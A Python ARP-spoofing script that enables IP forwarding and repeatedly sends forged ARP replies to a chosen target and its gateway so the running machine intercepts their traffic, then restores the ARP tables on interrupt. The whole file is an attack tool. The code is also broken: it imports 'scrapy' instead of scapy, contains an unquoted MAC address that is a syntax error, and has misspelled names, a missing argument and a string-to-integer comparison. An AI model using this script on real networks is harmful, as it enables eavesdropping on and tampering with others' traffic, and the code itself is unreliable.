from scrapy.all import Ether, ARP, send, srp
import argparse
import time 
import os
import sys

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

#just enabling ip route 4 all OS
def enable_ip_route(verbose=True):

    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")

def arpin(ip, time_out):
    #pdst is the target protocol address (simply the ip add of the receiver
    ans, _ = srp(Ether(dst=ff:ff:ff:ff:ff:ff) / ARP(pdst=ip), timeout = time_out, verbose = 0)  #sending arp request for mac addr
    if ans: 
        return ans[0][1].src

def spoofing(target_ip, host_ip, verbose = True):
    target_mac = arpin(target_ip, 5)
    arp_response = ARP(psdt = target_ip, hwdst = target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose =0 ) #sending spoofing packet
    if verbose:
        self_mac = ARP().hwsrc #the core, we're selling ourself as the owner of ARP().hwsrc address!
        print("[->] Success!")

def break_attack(target_ip, host_ip, verbose=True):
    target_mac = aroin(target_ip)
    host_mac = arpin(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("...")
        print("[->] Stopped")

if __name__ == "__main__":
    target = input("Enter (private) target ip: ") 
    # gateway ip 
    gateway = input("Enter gateway ip: ") 
    
    verbose = True
    # enable ip forwarding
    enable_ip_route()
    try:
        while True:
            #calling our functions
            spoofing(target, gateway, verbose)
            spoofing(gateway, target, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        break_attack(target, gateway)
        break_attack(gateway, target)